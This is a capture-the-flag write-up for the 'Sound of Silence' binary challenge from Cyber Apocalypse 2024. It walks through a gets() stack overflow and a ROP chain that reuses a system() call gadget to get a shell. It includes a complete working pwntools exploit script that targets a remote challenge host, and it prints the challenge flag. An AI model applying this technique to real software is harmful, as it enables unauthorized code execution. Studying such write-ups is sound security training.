---
title: "Sound of Silence - Writeup | Cyber Apocalypse 2024"
layout: post
author: Jorge Moreno
category: Easy
---

This challenge is part of the event [Cyber Apocalypse 2024: Hacker Royale](../cyber-apocalypse-ctf-2024)

## Challenge Description
---

> Navigate the shadows in a dimly lit room, silently evading detection as you strategize to outsmart your foes. Employ clever distractions to divert their attention, paving the way for your daring escape!
> 

Challenge Author(s): w3th4nds \
Category: **Binary Explotation**  
Difficulty: **Medium**

## TL;DR
---
- In this challenge we take advantage of a gadget that moves the return value of a function inside ``rdi`` register to call ``system`` with ``gets`` as an argument.

## Challenge Solution
---

First, we check the file with ``file`` and ``checksec`` commands:

```console
sound_of_silence: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e2468011150eb76534f79ed

❯ pwn checksec sound_of_silence
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
It does not have stack protector or PIE enabled. We can forget about shellcode because it has NX enabled.

Let's execute it and see what happens:

```console
~The Sound of Silence is mesmerising~

>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./sound_of_silence
```

The program asks for input and after **40** bytes it crashes with ``sigsegv``.  
After decompiling with **Ghidra** we see the code for the only function that it has ``main()``
```c
void main(void)
{
  char buf[32];
  
  system("clear && echo -n \'~The Sound of Silence is mesmerising~\n\n>> \'");
  gets(buf);
  return;
}
```
Looks good! We have a ``gets()`` function, it should be an easy ``ret2libc`` right?

Well we weren't that lucky this time. This binary has no ``plt`` functions other than ``gets@PLT`` and ``system@PLT``. 
```nasm
pwndbg> i fun
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401050  system@plt
0x0000000000401060  gets@plt
0x0000000000401070  _start
0x00000000004010a0  _dl_relocate_static_pie
0x00000000004010b0  deregister_tm_clones
0x00000000004010e0  register_tm_clones
0x0000000000401120  __do_global_dtors_aux
0x0000000000401150  frame_dummy
0x0000000000401156  main
0x0000000000401188  _fini
``` 
Let's take a look at the disassembly of the function. 

```nasm
<main>:
   0x0000000000401156 <+0>:     endbr64
   0x000000000040115a <+4>:     push   rbp
   0x000000000040115b <+5>:     mov    rbp,rsp
   0x000000000040115e <+8>:     sub    rsp,0x20
   0x0000000000401162 <+12>:    lea    rax,[rip+0xe9f]        # 0x402008
   0x0000000000401169 <+19>:    mov    rdi,rax
   0x000000000040116c <+22>:    call   0x401050 <system@plt>
   0x0000000000401171 <+27>:    lea    rax,[rbp-0x20]
   0x0000000000401175 <+31>:    mov    rdi,rax
   0x0000000000401178 <+34>:    mov    eax,0x0
   0x000000000040117d <+39>:    call   0x401060 <gets@plt>
   0x0000000000401182 <+44>:    nop
   0x0000000000401183 <+45>:    leave
   0x0000000000401184 <+46>:    ret
```

It loads the string ``clear && echo -n '~The Sound of Silence is mesmerising~\n\n>> '`` into ``rax`` and moves it ``mov rdi, rax``. Then calls ``system``.
The attack will be as follows:
- Use the ``gets()`` function to overflow the buffer and call ``gets()`` again.
- Send ``/bin/sh``
- *ROP* back to ``mov rdi, rax;`` so ``rdi`` has the address of our ``/bin/sh`` string
- Wait for our shell 

> ***NOTE:*** The function's return value is always stored in ``rax`` register.

We can craft our payload with the following structure: ``PADDING + gets@PLT + <mov rdi, rax; system@PLT>``
We can add a ``ret`` gadget for stack aligning purposes.
```python
mov_rdi_rax_system = 0x0000000000401169  # mov rdi, rax; call <system@plt>
offset = 40
ret = 0x000000000040101a

payload = b'A' * offset  
payload += flat(exe.plt.gets) + flat(ret) 
payload += flat(mov_rdi_rax_system)

io.sendlineafter(b'>>', payload)
io.sendline(b'/bin/sh')

io.interactive()
```

But after executing this we see it crashes.
```console
❯ python3 exp.py
 sh: 1: /bin.sh: not found
$  
```

Looks like for whatever reason it turned ``/`` into ``.``
With python console we can see that it is subtracting 1 to the value we send in the 4th position of the string.
```console
❯ python3
Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> ord('/')
47
>>> ord('.')
46
``` 
> ``chr(48) = '0'``  

Then the only thing we have to do now is change ``/bin/sh`` to ``/bin0sh`` and get our flag.

```console
❯ python3 exp.py
 $ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio) ...
```

### Full Script
---

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './sound_of_silence', checksec = False)
context.log_level = 'warning'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("94.237.53.81", 48107)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())
io = start()

mov_rdi_rax_system = 0x0000000000401169  # mov rdi, rax; call <system@plt>
offset = 40
ret = 0x000000000040101a

payload = b'A' * offset  
payload += flat(exe.plt.gets) + flat(ret) 
payload += flat(mov_rdi_rax_system)

io.sendlineafter(b'>>', payload)
io.sendline(b'/bin0sh')

io.interactive()
```
  
**FLAG - HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m}**